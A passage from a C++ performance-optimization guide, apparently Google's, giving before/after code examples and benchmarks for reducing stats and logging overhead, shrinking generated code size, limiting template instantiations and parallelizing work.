  if (!EnableSpecializedTags()) return sizeof(DynamicNode);

  switch (tag) {
    case Tag::kDynamic:
      return sizeof(DynamicNode);
    case Tag::kString:
      return sizeof(TaggedNode);
    case Tag::kCord:
      return sizeof(TaggedNode);
    default:
      ABSL_DCHECK(false) &lt;&lt; "Corrupted cleanup tag: " &lt;&lt; static_cast&lt;int&gt;(tag);
      return sizeof(DynamicNode);
  }
}
</code></pre>
</div>


</details>

<h3 id="reduce-stats-collection-costs">Reduce stats collection costs</h3>

<p>Balance the utility of stats and other behavioral information about a system
against the cost of maintaining that information. The extra information can
often help people to understand and improve high-level behavior, but can also be
costly to maintain.</p>

<p>Stats that are not useful can be dropped altogether.</p>

<details>
<summary><p>Stop maintaining expensive stats about number of alarms and
closures in SelectServer.</p>
</summary>

<p>Part of changes that reduce time for setting an alarm from 771 ns to 271 ns.</p>
<p>selectserver.h</p>

<div>
<pre><code>class SelectServer {
 public:
 ...
 protected:
  ...
  scoped_ptr&lt;MinuteTenMinuteHourStat&gt; num_alarms_stat_;
  ...
  scoped_ptr&lt;MinuteTenMinuteHourStat&gt; num_closures_stat_;
  ...
};
</code></pre>
</div>

<div>
<pre><code>// Selectserver class
class SelectServer {
 ...
 protected:
 ...
};
</code></pre>
</div>

<p>/selectserver.cc</p>

<div>
<pre><code>void SelectServer::AddAlarmInternal(Alarmer* alarmer,
                                    int offset_in_ms,
                                    int id,
                                    bool is_periodic) {
                                    ...
  alarms_-&gt;insert(alarm);
  num_alarms_stat_-&gt;IncBy(1);
  ...
}
</code></pre>
</div>

<div>
<pre><code>void SelectServer::AddAlarmInternal(Alarmer* alarmer,
                                    int offset_in_ms,
                                    int id,
                                    bool is_periodic) {
                                    ...
  alarms_-&gt;Add(alarm);
  ...
}
</code></pre>
</div>

<p>/selectserver.cc</p>

<div>
<pre><code>void SelectServer::RemoveAlarm(Alarmer* alarmer, int id) {
      ...
      alarms_-&gt;erase(alarm);
      num_alarms_stat_-&gt;IncBy(-1);
      ...
}
</code></pre>
</div>

<div>
<pre><code>void SelectServer::RemoveAlarm(Alarmer* alarmer, int id) {
      ...
      alarms_-&gt;Remove(alarm);
      ...
}
</code></pre>
</div>


</details>

<p>Often, stats or other properties can be maintained for a sample of the elements
handled by the system (e.g., RPC requests, input records, users). Many
subsystems use this approach (tcmalloc allocation tracking, /requestz status
pages, Dapper samples).</p>

<p>When sampling, consider reducing the sampling rate when appropriate.</p>

<details>
<summary><p>Maintain stats for just a sample of doc info requests.</p>
</summary>

<p>Sampling allows us to avoid touching 39 histograms and MinuteTenMinuteHour stats
for most requests.</p>
<p>generic-leaf-stats.cc</p>
<pre><code>... code that touches 39 histograms to update various stats on every request ...
</code></pre>
<pre><code>// Add to the histograms periodically
if (TryLockToUpdateHistogramsDocInfo(docinfo_stats, bucket)) {
  // Returns true and grabs bucket-&gt;lock only if we should sample this
  // request for maintaining stats
  ... code that touches 39 histograms to update various stats ...
  bucket-&gt;lock.Unlock();
}
</code></pre>

</details>

<details>
<summary><p>Reduce sampling rate and make faster sampling decisions.</p>
</summary>

<p>This change reduces the sampling rate from 1 in 10 to 1 in 32. Furthermore, we
now keep execution time stats just for the sampled events and speed up sampling
decisions by using a power of two modulus. This code is called on every packet
in the Google Meet video conferencing system and needed performance work to keep
up with capacity demands during the first part of the COVID outbreak as users
rapidly migrated to doing more online meetings.</p>
<p>packet_executor.cc</p>

<div>
<pre><code>class ScopedPerformanceMeasurement {
 public:
  explicit ScopedPerformanceMeasurement(PacketExecutor* packet_executor)
      : packet_executor_(packet_executor),
        tracer_(packet_executor-&gt;packet_executor_trace_threshold_,
                kClosureTraceName) {
    // ThreadCPUUsage is an expensive call. At the time of writing,
    // it takes over 400ns, or roughly 30 times slower than absl::Now,
    // so we sample only 10% of closures to keep the cost down.
    if (packet_executor-&gt;closures_executed_ % 10 == 0) {
      thread_cpu_usage_start_ = base::ThreadCPUUsage();
    }

    // Sample start time after potentially making the above expensive call,
    // so as not to pollute wall time measurements.
    run_start_time_ = absl::Now();
  }

  ~ScopedPerformanceMeasurement() {
</code></pre>
</div>

<div>
<pre><code>ScopedPerformanceMeasurement::ScopedPerformanceMeasurement(
    PacketExecutor* packet_executor)
    : packet_executor_(packet_executor),
      tracer_(packet_executor-&gt;packet_executor_trace_threshold_,
              kClosureTraceName) {
  // ThreadCPUUsage is an expensive call. At the time of writing,
  // it takes over 400ns, or roughly 30 times slower than absl::Now,
  // so we sample only 1 in 32 closures to keep the cost down.
  if (packet_executor-&gt;closures_executed_ % 32 == 0) {
    thread_cpu_usage_start_ = base::ThreadCPUUsage();
  }

  // Sample start time after potentially making the above expensive call,
  // so as not to pollute wall time measurements.
  run_start_time_ = absl::Now();
}
</code></pre>
</div>

<p>packet_executor.cc</p>

<div>
<pre><code>~ScopedPerformanceMeasurement() {
  auto run_end_time = absl::Now();
  auto run_duration = run_end_time - run_start_time_;

  if (thread_cpu_usage_start_.has_value()) {
  ...
  }

  closure_execution_time-&gt;Record(absl::ToInt64Microseconds(run_duration));
</code></pre>
</div>

<div>
<pre><code>ScopedPerformanceMeasurement::~ScopedPerformanceMeasurement() {
  auto run_end_time = absl::Now();
  auto run_duration = run_end_time - run_start_time_;

  if (thread_cpu_usage_start_.has_value()) {
    ...
    closure_execution_time-&gt;Record(absl::ToInt64Microseconds(run_duration));
  }
</code></pre>
</div>

<p>Benchmark results:</p>
<pre><code>Run on (40 X 2793 MHz CPUs); 2020-03-24T20:08:19.991412535-07:00
CPU: Intel Ivybridge with HyperThreading (20 cores) dL1:32KB dL2:256KB dL3:25MB
Benchmark                                      Base (ns)    New (ns) Improvement
----------------------------------------------------------------------------
BM_PacketOverhead_mean                               224          85    +62.0%
</code></pre>

</details>

<h3 id="avoid-logging-on-hot-code-paths">Avoid logging on hot code paths</h3>

<p>Logging statements can be costly, even if the logging-level for the statement
doesn’t actually log anything. E.g., <code>ABSL_VLOG</code>’s implementation requires at
least a load and a comparison, which may be a problem in hot code paths. In
addition, the presence of the logging code may inhibit compiler optimizations.
Consider dropping logging entirely from hot code paths.</p>

<details>
<summary><p>Remove logging from guts of memory allocator.</p>
</summary>

<p>This was a small part of a larger change.</p>
<p>gpu_bfc_allocator.cc</p>
<pre><code>void GPUBFCAllocator::SplitChunk(...) {
  ...
  VLOG(6) &lt;&lt; "Adding to chunk map: " &lt;&lt; new_chunk-&gt;ptr;
  ...
}
...
void GPUBFCAllocator::DeallocateRawInternal(void* ptr) {
  ...
  VLOG(6) &lt;&lt; "Chunk at " &lt;&lt; c-&gt;ptr &lt;&lt; " no longer in use";
  ...
}
</code></pre>
<pre><code>void GPUBFCAllocator::SplitChunk(...) {
...
}
...
void GPUBFCAllocator::DeallocateRawInternal(void* ptr) {
...
}
</code></pre>

</details>

<details>
<summary><p>Precompute whether or not logging is enabled outside a
nested loop.</p>
</summary>

<p>image_similarity.cc</p>

<div>
<pre><code>for (int j = 0; j &lt; output_subimage_size_y; j++) {
  int j1 = j - rad + output_to_integral_subimage_y;
  int j2 = j1 + 2 * rad + 1;
  // Create a pointer for this row's output, taking into account the offset
  // to the full image.
  double *image_diff_ptr = &amp;(*image_diff)(j + min_j, min_i);

  for (int i = 0; i &lt; output_subimage_size_x; i++) {
    ...
    if (VLOG_IS_ON(3)) {
    ...
    }
    ...
  }
}
</code></pre>
</div>

<div>
<pre><code>const bool vlog_3 = DEBUG_MODE ? VLOG_IS_ON(3) : false;

for (int j = 0; j &lt; output_subimage_size_y; j++) {
  int j1 = j - rad + output_to_integral_subimage_y;
  int j2 = j1 + 2 * rad + 1;
  // Create a pointer for this row's output, taking into account the offset
  // to the full image.
  double *image_diff_ptr = &amp;(*image_diff)(j + min_j, min_i);

  for (int i = 0; i &lt; output_subimage_size_x; i++) {
    ...
    if (vlog_3) {
    ...
    }
  }
}
</code></pre>
</div>

<pre><code>Run on (40 X 2801 MHz CPUs); 2016-05-16T15:55:32.250633072-07:00
CPU: Intel Ivybridge with HyperThreading (20 cores) dL1:32KB dL2:256KB dL3:25MB
Benchmark                          Base (ns)  New (ns) Improvement
------------------------------------------------------------------
BM_NCCPerformance/16                   29104     26372     +9.4%
BM_NCCPerformance/64                  473235    425281    +10.1%
BM_NCCPerformance/512               30246238  27622009     +8.7%
BM_NCCPerformance/1k              125651445  113361991     +9.8%
BM_NCCLimitedBoundsPerformance/16       8314      7498     +9.8%
BM_NCCLimitedBoundsPerformance/64     143508    132202     +7.9%
BM_NCCLimitedBoundsPerformance/512   9335684   8477567     +9.2%
BM_NCCLimitedBoundsPerformance/1k   37223897  34201739     +8.1%
</code></pre>

</details>

<details>
<summary><p>Precompute whether logging is enabled and use the result
in helper routines.</p>
</summary>

<p>periodic_call.cc</p>

<div>
<pre><code>  VLOG(1) &lt;&lt; Logid()
          &lt;&lt; "MaybeScheduleAlarmAtNextTick. Time until next real time: "
          &lt;&lt; time_until_next_real_time;
          ...
  uint64 next_virtual_time_ms =
      next_virtual_time_ms_ - num_ticks * kResolutionMs;
  CHECK_GE(next_virtual_time_ms, 0);
  ScheduleAlarm(now, delay, next_virtual_time_ms);
}

void ScheduleNextAlarm(uint64 current_virtual_time_ms)
    ABSL_EXCLUSIVE_LOCKS_REQUIRED(mutex_) {
  if (calls_.empty()) {
    VLOG(1) &lt;&lt; Logid() &lt;&lt; "No calls left, entering idle mode";
    next_real_time_ = absl::InfiniteFuture();
    return;
  }
  uint64 next_virtual_time_ms = FindNextVirtualTime(current_virtual_time_ms);
  auto delay =
      absl::Milliseconds(next_virtual_time_ms - current_virtual_time_ms);
  ScheduleAlarm(GetClock().TimeNow(), delay, next_virtual_time_ms);
}

// An alarm scheduled by this function supersedes all previously scheduled
// alarms. This is ensured through `scheduling_sequence_number_`.
void ScheduleAlarm(absl::Time now, absl::Duration delay,
                   uint64 virtual_time_ms)
    ABSL_EXCLUSIVE_LOCKS_REQUIRED(mutex_) {
  next_real_time_ = now + delay;
  next_virtual_time_ms_ = virtual_time_ms;
  ++ref_count_;  // The Alarm holds a reference.
  ++scheduling_sequence_number_;
  VLOG(1) &lt;&lt; Logid() &lt;&lt; "ScheduleAlarm. Time : "
          &lt;&lt; absl::FormatTime("%M:%S.%E3f", now, absl::UTCTimeZone())
          &lt;&lt; ", delay: " &lt;&lt; delay &lt;&lt; ", virtual time: " &lt;&lt; virtual_time_ms
          &lt;&lt; ", refs: " &lt;&lt; ref_count_
          &lt;&lt; ", seq: " &lt;&lt; scheduling_sequence_number_
          &lt;&lt; ", executor: " &lt;&lt; executor_;

  executor_-&gt;AddAfter(
      delay, new Alarm(this, virtual_time_ms, scheduling_sequence_number_));
}
</code></pre>
</div>

<div>
<pre><code>  const bool vlog_1 = VLOG_IS_ON(1);

  if (vlog_1) {
    VLOG(1) &lt;&lt; Logid()
            &lt;&lt; "MaybeScheduleAlarmAtNextTick. Time until next real time: "
            &lt;&lt; time_until_next_real_time;
  }
  ...
  uint64 next_virtual_time_ms =
      next_virtual_time_ms_ - num_ticks * kResolutionMs;
  CHECK_GE(next_virtual_time_ms, 0);
  ScheduleAlarm(now, delay, next_virtual_time_ms, vlog_1);
}

void ScheduleNextAlarm(uint64 current_virtual_time_ms, bool vlog_1)
    ABSL_EXCLUSIVE_LOCKS_REQUIRED(mutex_) {
  if (calls_.empty()) {
    if (vlog_1) {
      VLOG(1) &lt;&lt; Logid() &lt;&lt; "No calls left, entering idle mode";
    }
    next_real_time_ = absl::InfiniteFuture();
    return;
  }
  uint64 next_virtual_time_ms = FindNextVirtualTime(current_virtual_time_ms);
  auto delay =
      absl::Milliseconds(next_virtual_time_ms - current_virtual_time_ms);
  ScheduleAlarm(GetClock().TimeNow(), delay, next_virtual_time_ms, vlog_1);
}

// An alarm scheduled by this function supersedes all previously scheduled
// alarms. This is ensured through `scheduling_sequence_number_`.
void ScheduleAlarm(absl::Time now, absl::Duration delay,
                   uint64 virtual_time_ms,
                   bool vlog_1)
    ABSL_EXCLUSIVE_LOCKS_REQUIRED(mutex_) {
  next_real_time_ = now + delay;
  next_virtual_time_ms_ = virtual_time_ms;
  ++ref_count_;  // The Alarm holds a reference.
  ++scheduling_sequence_number_;
  if (vlog_1) {
    VLOG(1) &lt;&lt; Logid() &lt;&lt; "ScheduleAlarm. Time : "
            &lt;&lt; absl::FormatTime("%M:%S.%E3f", now, absl::UTCTimeZone())
            &lt;&lt; ", delay: " &lt;&lt; delay &lt;&lt; ", virtual time: " &lt;&lt; virtual_time_ms
            &lt;&lt; ", refs: " &lt;&lt; ref_count_
            &lt;&lt; ", seq: " &lt;&lt; scheduling_sequence_number_
            &lt;&lt; ", executor: " &lt;&lt; executor_;
  }

  executor_-&gt;AddAfter(
      delay, new Alarm(this, virtual_time_ms, scheduling_sequence_number_));
}
</code></pre>
</div>


</details>

<h2 id="code-size-considerations">Code size considerations</h2>

<p>Performance encompasses more than just runtime speed. Sometimes it is worth
considering the effects of software choices on the size of generated code. Large
code size means longer compile and link times, bloated binaries, more memory
usage, more icache pressure, and other sometimes negative effects on
microarchitectural structures like branch predictors, etc.  Thinking about these issues is especially
important when writing low-level library code that will be used in many places,
or when writing templated code that you expect will be instantiated for many
different types.</p>

<p>The techniques that are useful for reducing code size vary significantly across
programming languages. Here are some techniques that we have found useful for
C++ code (which can suffer from an over-use of templates and inlining).</p>

<h3 id="trim-commonly-inlined-code">Trim commonly inlined code</h3>

<p>Widely called functions combined with inlining can have a dramatic effect on
code size.</p>

<details>
<summary><p>Speed up TF_CHECK_OK.</p>
</summary>

<p>Avoid creating Ok object, and save code space by doing complex formatting of
fatal error message out of line instead of at every call site.</p>
<p>status.h</p>

<div>
<pre><code>#define TF_CHECK_OK(val) CHECK_EQ(::tensorflow::Status::OK(), (val))
#define TF_QCHECK_OK(val) QCHECK_EQ(::tensorflow::Status::OK(), (val))
</code></pre>
</div>

<div>
<pre><code>extern tensorflow::string* TfCheckOpHelperOutOfLine(
    const ::tensorflow::Status&amp; v, const char* msg);
inline tensorflow::string* TfCheckOpHelper(::tensorflow::Status v,
                                           const char* msg) {
  if (v.ok()) return nullptr;
  return TfCheckOpHelperOutOfLine(v, msg);
}
#define TF_CHECK_OK(val)                                           \
  while (tensorflow::string* _result = TfCheckOpHelper(val, #val)) \
  LOG(FATAL) &lt;&lt; *(_result)
#define TF_QCHECK_OK(val)                                          \
  while (tensorflow::string* _result = TfCheckOpHelper(val, #val)) \
  LOG(QFATAL) &lt;&lt; *(_result)
</code></pre>
</div>

<p>status.cc</p>

<div>
<pre><code>string* TfCheckOpHelperOutOfLine(const ::tensorflow::Status&amp; v,
                                 const char* msg) {
  string r("Non-OK-status: ");
  r += msg;
  r += " status: ";
  r += v.ToString();
  // Leaks string but this is only to be used in a fatal error message
  return new string(r);
}
</code></pre>
</div>


</details>

<details>
<summary><p>Shrink each RETURN_IF_ERROR call site by 79 bytes of
code.</p>
</summary>

<ol>
<li>Added special adaptor class for use by just RETURN_IF_ERROR.</li>
<li>Do not construct/destruct StatusBuilder on fast path of RETURN_IF_ERROR.</li>
<li>Do not inline some StatusBuilder methods since they are now no longer needed
on the fast path.</li>
<li>Avoid unnecessary ~Status call.</li>
</ol>

</details>

<details>
<summary><p>Improve performance of CHECK_GE by 4.5X and shrink code
size from 125 bytes to 77 bytes.</p>
</summary>

<p>logging.h</p>

<div>
<pre><code>struct CheckOpString {
  CheckOpString(string* str) : str_(str) { }
  ~CheckOpString() { delete str_; }
  operator bool() const { return str_ == NULL; }
  string* str_;
};
...
#define DEFINE_CHECK_OP_IMPL(name, op) \
  template &lt;class t1, class t2&gt; \
  inline string* Check##name##Impl(const t1&amp; v1, const t2&amp; v2, \
                                   const char* names) { \
    if (v1 op v2) return NULL; \
    else return MakeCheckOpString(v1, v2, names); \
  } \
  string* Check##name##Impl(int v1, int v2, const char* names);
DEFINE_CHECK_OP_IMPL(EQ, ==)
DEFINE_CHECK_OP_IMPL(NE, !=)
DEFINE_CHECK_OP_IMPL(LE, &lt;=)
DEFINE_CHECK_OP_IMPL(LT, &lt; )
DEFINE_CHECK_OP_IMPL(GE, &gt;=)
DEFINE_CHECK_OP_IMPL(GT, &gt; )
#undef DEFINE_CHECK_OP_IMPL
</code></pre>
</div>

<div>
<pre><code>struct CheckOpString {
  CheckOpString(string* str) : str_(str) { }
  // No destructor: if str_ is non-NULL, we're about to LOG(FATAL),
  // so there's no point in cleaning up str_.
  operator bool() const { return str_ == NULL; }
  string* str_;
};
...
extern string* MakeCheckOpStringIntInt(int v1, int v2, const char* names);

template&lt;int, int&gt;
string* MakeCheckOpString(const int&amp; v1, const int&amp; v2, const char* names) {
  return MakeCheckOpStringIntInt(v1, v2, names);
}
...
#define DEFINE_CHECK_OP_IMPL(name, op) \
  template &lt;class t1, class t2&gt; \
  inline string* Check##name##Impl(const t1&amp; v1, const t2&amp; v2, \
                                   const char* names) { \
    if (v1 op v2) return NULL; \
    else return MakeCheckOpString(v1, v2, names); \
  } \
  inline string* Check##name##Impl(int v1, int v2, const char* names) { \
    if (v1 op v2) return NULL; \
    else return MakeCheckOpString(v1, v2, names); \
  }
DEFINE_CHECK_OP_IMPL(EQ, ==)
DEFINE_CHECK_OP_IMPL(NE, !=)
DEFINE_CHECK_OP_IMPL(LE, &lt;=)
DEFINE_CHECK_OP_IMPL(LT, &lt; )
DEFINE_CHECK_OP_IMPL(GE, &gt;=)
DEFINE_CHECK_OP_IMPL(GT, &gt; )
#undef DEFINE_CHECK_OP_IMPL
</code></pre>
</div>

<p>logging.cc</p>

<div>
<pre><code>string* MakeCheckOpStringIntInt(int v1, int v2, const char* names) {
  strstream ss;
  ss &lt;&lt; names &lt;&lt; " (" &lt;&lt; v1 &lt;&lt; " vs. " &lt;&lt; v2 &lt;&lt; ")";
  return new string(ss.str(), ss.pcount());
}
</code></pre>
</div>


</details>

<h3 id="inline-with-care">Inline with care</h3>

<p>Inlining can often improve performance, but sometimes it can increase code size
without a corresponding performance payoff (and in some case even a performance
loss due to increased instruction cache pressure).</p>

<details>
<summary><p>Reduce inlining in TensorFlow.</p>
</summary>

<p>The change stops inlining many non-performance-sensitive functions (e.g., error
paths and op registration code). Furthermore, slow paths of some
performance-sensitive functions are moved into non-inlined functions.</p>
<p>These changes reduces the size of tensorflow symbols in a typical binary by
12.2% (8814545 bytes down to 7740233 bytes)</p>

</details>

<details>
<summary><p>Protocol buffer library change. Avoid expensive inlined
code space for encoding message length for messages ≥ 128 bytes and instead
do a procedure call to a shared out-of-line routine.</p>
</summary>

<p>Not only makes important large binaries smaller but also faster.</p>
<p>Bytes of generated code per line of a heavily inlined routine in one large
binary. First number represents the total bytes generated for a particular
source line including all locations where that code has been inlined.</p>
<p>Before:</p>
<pre><code>.           0   1825 template &lt;typename MessageType&gt;
.           0   1826 inline uint8* WireFormatLite::InternalWriteMessage(
.           0   1827     int field_number, const MessageType&amp; value, uint8* target,
.           0   1828     io::EpsCopyOutputStream* stream) {
&gt;&gt;&gt;    389246   1829   target = WriteTagToArray(field_number, WIRETYPE_LENGTH_DELIMITED, target);
&gt;&gt;&gt;   5454640   1830   target = io::CodedOutputStream::WriteVarint32ToArray(
&gt;&gt;&gt;    337837   1831       static_cast&lt;uint32&gt;(value.GetCachedSize()), target);
&gt;&gt;&gt;   1285539   1832   return value._InternalSerialize(target, stream);
.           0   1833 }
</code></pre>
<p>The new codesize output with this change looks like:</p>
<pre><code>.           0   1825 template &lt;typename MessageType&gt;
.           0   1826 inline uint8* WireFormatLite::InternalWriteMessage(
.           0   1827     int field_number, const MessageType&amp; value, uint8* target,
.           0   1828     io::EpsCopyOutputStream* stream) {
&gt;&gt;&gt;    450612   1829   target = WriteTagToArray(field_number, WIRETYPE_LENGTH_DELIMITED, target);
&gt;&gt;       9609   1830   target = io::CodedOutputStream::WriteVarint32ToArrayOutOfLine(
&gt;&gt;&gt;    434668   1831       static_cast&lt;uint32&gt;(value.GetCachedSize()), target);
&gt;&gt;&gt;   1597394   1832   return value._InternalSerialize(target, stream);
.           0   1833 }
</code></pre>
<p>coded_stream.h</p>

<div>
<pre><code>class PROTOBUF_EXPORT CodedOutputStream {
  ...
  // Like WriteVarint32()  but writing directly to the target array, and with the
  // less common-case paths being out of line rather than inlined.
  static uint8* WriteVarint32ToArrayOutOfLine(uint32 value, uint8* target);
  ...
};
...
inline uint8* CodedOutputStream::WriteVarint32ToArrayOutOfLine(uint32 value,
                                                               uint8* target) {
  target[0] = static_cast&lt;uint8&gt;(value);
  if (value &lt; 0x80) {
    return target + 1;
  } else {
    return WriteVarint32ToArrayOutOfLineHelper(value, target);
  }
}
</code></pre>
</div>

<p>coded_stream.cc</p>

<div>
<pre><code>uint8* CodedOutputStream::WriteVarint32ToArrayOutOfLineHelper(uint32 value,
                                                              uint8* target) {
  DCHECK_GE(value, 0x80);
  target[0] |= static_cast&lt;uint8&gt;(0x80);
  value &gt;&gt;= 7;
  target[1] = static_cast&lt;uint8&gt;(value);
  if (value &lt; 0x80) {
    return target + 2;
  }
  target += 2;
  do {
    // Turn on continuation bit in the byte we just wrote.
    target[-1] |= static_cast&lt;uint8&gt;(0x80);
    value &gt;&gt;= 7;
    *target = static_cast&lt;uint8&gt;(value);
    ++target;
  } while (value &gt;= 0x80);
  return target;
}
</code></pre>
</div>


</details>

<details>
<summary><p>Reduce absl::flat_hash_set and absl::flat_hash_map code
size.</p>
</summary>

<ol>
<li>Extract code that does not depend on the specific hash table type into
common (non-inlined) functions.</li>
<li>Place ABSL_ATTRIBUTE_NOINLINE directives judiciously.</li>
<li>Out-of-line some slow paths.</li>
</ol>
<p>Reduces sizes of some large binaries by ~0.5%.</p>

</details>

<details>
<summary><p>Do not inline string allocation and deallocation when not
using protobuf arenas.</p>
</summary>

<p>public/arenastring.h</p>

<div>
<pre><code>  if (IsDefault(default_value)) {
    std::string* new_string = new std::string();
    tagged_ptr_.Set(new_string);
    return new_string;
  } else {
    return UnsafeMutablePointer();
  }
}
</code></pre>
</div>

<div>
<pre><code>  if (IsDefault(default_value)) {
    return SetAndReturnNewString();
  } else {
    return UnsafeMutablePointer();
  }
}
</code></pre>
</div>

<p>internal/arenastring.cc</p>

<div>
<pre><code>std::string* ArenaStringPtr::SetAndReturnNewString() {
  std::string* new_string = new std::string();
  tagged_ptr_.Set(new_string);
  return new_string;
}
</code></pre>
</div>


</details>

<details>
<summary><p>Avoid inlining some routines. Create variants of routines
that take 'const char*' rather than 'const std::string&amp;' to avoid std::string
construction code at every call site.</p>
</summary>

<p>op.h</p>

<div>
<pre><code>class OpDefBuilderWrapper {
 public:
  explicit OpDefBuilderWrapper(const char name[]) : builder_(name) {}
  OpDefBuilderWrapper&amp; Attr(std::string spec) {
    builder_.Attr(std::move(spec));
    return *this;
  }
  OpDefBuilderWrapper&amp; Input(std::string spec) {
    builder_.Input(std::move(spec));
    return *this;
  }
  OpDefBuilderWrapper&amp; Output(std::string spec) {
    builder_.Output(std::move(spec));
    return *this;
  }
</code></pre>
</div>

<div>
<pre><code>class OpDefBuilderWrapper {
 public:
  explicit OpDefBuilderWrapper(const char name[]) : builder_(name) {}
  OpDefBuilderWrapper&amp; Attr(std::string spec) {
    builder_.Attr(std::move(spec));
    return *this;
  }
  OpDefBuilderWrapper&amp; Attr(const char* spec) TF_ATTRIBUTE_NOINLINE {
    return Attr(std::string(spec));
  }
  OpDefBuilderWrapper&amp; Input(std::string spec) {
    builder_.Input(std::move(spec));
    return *this;
  }
  OpDefBuilderWrapper&amp; Input(const char* spec) TF_ATTRIBUTE_NOINLINE {
    return Input(std::string(spec));
  }
  OpDefBuilderWrapper&amp; Output(std::string spec) {
    builder_.Output(std::move(spec));
    return *this;
  }
  OpDefBuilderWrapper&amp; Output(const char* spec) TF_ATTRIBUTE_NOINLINE {
    return Output(std::string(spec));
  }
</code></pre>
</div>


</details>

<h3 id="reduce-template-instantiations">Reduce template instantiations</h3>

<p>Templated code can be duplicated for every possible combination of template
arguments when it is instantiated.</p>

<details>
<summary><p>Replace template argument with a regular argument.</p>
</summary>

<p>Changed a large routine templated on a bool to instead take the bool as an extra
argument. (The bool was only being used once to select one of two string
constants, so a run-time check was just fine.) This reduced the # of
instantiations of the large routine from 287 to 143.</p>
<p>sharding_util_ops.cc</p>

<div>
<pre><code>template &lt;bool Split&gt;
Status GetAndValidateAttributes(OpKernelConstruction* ctx,
                                std::vector&lt;int32&gt;&amp; num_partitions,
                                int&amp; num_slices, std::vector&lt;int32&gt;&amp; paddings,
                                bool&amp; has_paddings) {
  absl::string_view num_partitions_attr_name =
      Split ? kNumSplitsAttrName : kNumConcatsAttrName;
      ...
  return OkStatus();
}
</code></pre>
</div>

<div>
<pre><code>Status GetAndValidateAttributes(bool split, OpKernelConstruction* ctx,
                                std::vector&lt;int32&gt;&amp; num_partitions,
                                int&amp; num_slices, std::vector&lt;int32&gt;&amp; paddings,
                                bool&amp; has_paddings) {
  absl::string_view num_partitions_attr_name =
      split ? kNumSplitsAttrName : kNumConcatsAttrName;
      ...
  return OkStatus();
}
</code></pre>
</div>


</details>

<details>
<summary><p>Move bulky code from templated constructor to a
non-templated shared base class constructor.</p>
</summary>

<p>Also reduce number of template instantiations from one for every combination of
<code>&lt;T, Device, Rank&gt;</code> to one for every <code>&lt;T&gt;</code> and every <code>&lt;Rank&gt;</code>.</p>
<p>sharding_util_ops.cc</p>

<div>
<pre><code>template &lt;typename Device, typename T&gt;
class XlaSplitNDBaseOp : public OpKernel {
 public:
  explicit XlaSplitNDBaseOp(OpKernelConstruction* ctx) : OpKernel(ctx) {
    OP_REQUIRES_OK(
        ctx, GetAndValidateAttributes(/*split=*/true, ctx, num_splits_,
                                      num_slices_, paddings_, has_paddings_));
  }
</code></pre>
</div>

<div>
<pre><code>// Shared base class to save code space
class XlaSplitNDShared : public OpKernel {
 public:
  explicit XlaSplitNDShared(OpKernelConstruction* ctx) TF_ATTRIBUTE_NOINLINE
      : OpKernel(ctx),
        num_slices_(1),
        has_paddings_(false) {
    GetAndValidateAttributes(/*split=*/true, ctx, num_splits_, num_slices_,
                             paddings_, has_paddings_);
  }
</code></pre>
</div>


</details>

<details>
<summary><p>Reduce generated code size for absl::flat_hash_set and
absl::flat_hash_map.</p>
</summary>

<ul>
<li>Extract code that does not depend on the specific hash table type into
common (non-inlined) functions.</li>
<li>Place ABSL_ATTRIBUTE_NOINLINE directives judiciously.</li>
<li>Move some slow paths out of line.</li>
</ul>

</details>

<h3 id="reduce-container-operations">Reduce container operations</h3>

<p>Consider the impact of map and other container operations since each call to
such and operation can produce large amounts of generated code.</p>

<details>
<summary><p>Turn many map insertion calls in a row to initialize a
hash table of emoji characters into a single bulk insert operation (188KB of
text down to 360 bytes in library linked into many binaries). 😊</p>
</summary>

<p>textfallback_init.h</p>

<div>
<pre><code>inline void AddEmojiFallbacks(TextFallbackMap *map) {
  (*map)[0xFE000] = &amp;kFE000;
  (*map)[0xFE001] = &amp;kFE001;
  (*map)[0xFE002] = &amp;kFE002;
  (*map)[0xFE003] = &amp;kFE003;
  (*map)[0xFE004] = &amp;kFE004;
  (*map)[0xFE005] = &amp;kFE005;
  ...
  (*map)[0xFEE7D] = &amp;kFEE7D;
  (*map)[0xFEEA0] = &amp;kFEEA0;
  (*map)[0xFE331] = &amp;kFE331;
};
</code></pre>
</div>

<div>
<pre><code>inline void AddEmojiFallbacks(TextFallbackMap *map) {
#define PAIR(x) {0x##x, &amp;k##x}
  // clang-format off
  map-&gt;insert({
    PAIR(FE000),
    PAIR(FE001),
    PAIR(FE002),
    PAIR(FE003),
    PAIR(FE004),
    PAIR(FE005),
    ...
    PAIR(FEE7D),
    PAIR(FEEA0),
    PAIR(FE331)});
  // clang-format on
#undef PAIR
};
</code></pre>
</div>


</details>

<details>
<summary><p>Stop inlining a heavy user of InlinedVector operations.</p>
</summary>

<p>Moved very long routine that was being inlined from .h file to .cc (no real
performance benefit from inlining this).</p>
<p>reduction_ops_common.h</p>
<pre><code>Status Simplify(const Tensor&amp; data, const Tensor&amp; axis,
                const bool keep_dims) {
  ... Eighty line routine body ...
}
</code></pre>
<pre><code>Status Simplify(const Tensor&amp; data, const Tensor&amp; axis, const bool keep_dims);
</code></pre>

</details>

<h2 id="parallelization-and-synchronization">Parallelization and synchronization</h2>

<h3 id="exploit-parallelism">Exploit parallelism</h3>

<p>Modern machines have many cores, and they are often underutilized. Expensive
work may therefore be completed faster by parallelizing it. The most common
approach is to process different items in parallel and combine the results when
done. Typically, the items are first partitioned into batches to avoid paying
the cost of running something in parallel per item.</p>

<details>
<summary><p>Four-way parallelization improves the rate of encoding
tokens by ~3.6x.</p>
</summary>

<p>blocked-token-coder.cc</p>

<div>
<pre><code>MutexLock l(&amp;encoder_threads_lock);
if (encoder_threads == NULL) {
  encoder_threads = new ThreadPool(NumCPUs());
  encoder_threads-&gt;SetStackSize(262144);
  encoder_threads-&gt;StartWorkers();
}
encoder_threads-&gt;Add
    (NewCallback(this,
                 &amp;BlockedTokenEncoder::EncodeRegionInThread,
                 region_tokens, N, region,
                 stats,
                 controller_-&gt;GetClosureWithCost
                 (NewCallback(&amp;DummyCallback), N)));
</code></pre>
</div>


</details>

<details>
<summary><p>Parallelization improves decoding performance by 5x.</p>
</summary>

<p>coding.cc</p>
<pre><code>for (int c = 0; c &lt; clusters-&gt;size(); c++) {
  RET_CHECK_OK(DecodeBulkForCluster(...);
}
</code></pre>
<pre><code>struct SubTask {
  absl::Status result;
  absl::Notification done;
};

std::vector&lt;SubTask&gt; tasks(clusters-&gt;size());
for (int c = 0; c &lt; clusters-&gt;size(); c++) {
  options_.executor-&gt;Schedule([&amp;, c] {
    tasks[c].result = DecodeBulkForCluster(...);
    tasks[c].done.Notify();
  });
}
for (int c = 0; c &lt; clusters-&gt;size(); c++) {
